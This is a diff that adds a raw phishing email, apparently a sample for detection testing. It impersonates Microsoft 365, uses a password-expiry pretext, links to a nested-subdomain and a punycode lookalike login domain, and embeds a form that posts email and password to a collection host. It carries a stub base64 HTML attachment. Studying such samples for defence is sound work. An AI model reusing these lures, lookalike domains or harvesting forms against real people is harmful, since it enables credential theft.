@@ -1,0 +1,36 @@
+Return-Path: <docs@share-portal.example>
+Received: from relay.share-portal.example (relay.share-portal.example [203.0.113.200])
+	by mx1.corp.example (Postfix) with ESMTP id 55EE0912
+	for <hr@corp.example>; Fri, 13 Nov 2026 10:11:00 +0000
+Authentication-Results: mx1.corp.example;
+	spf=softfail smtp.mailfrom=share-portal.example;
+	dkim=pass header.d=share-portal.example;
+	dmarc=fail header.from=share-portal.example
+From: "Microsoft 365" <docs@share-portal.example>
+To: hr@corp.example
+Subject: You have received a secure document
+Date: Fri, 13 Nov 2026 10:10:55 +0000
+Message-ID: <doc-55ee@share-portal.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="MIX2"
+
+--MIX2
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>A secure document has been shared with you. Your password expires today;
+sign in to review the document.</p>
+<p><a href="https://login.microsoftonline.com.auth-session.top/common/oauth2">Open document</a></p>
+<p><a href="https://xn--micrsoft-qbh.com/view">Alternative viewer</a></p>
+<form action="https://collect.share-portal.example/submit" method="post">
+<input name="email"><input name="password" type="password"></form>
+</body></html>
+
+--MIX2
+Content-Type: text/html; name="Secure_Document.html"
+Content-Disposition: attachment; filename="Secure_Document.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PHNjcmlwdD52YXIgYj1hdG9iKCcuLi4nKTs8L3NjcmlwdD48L2h0bWw+
+
+--MIX2--
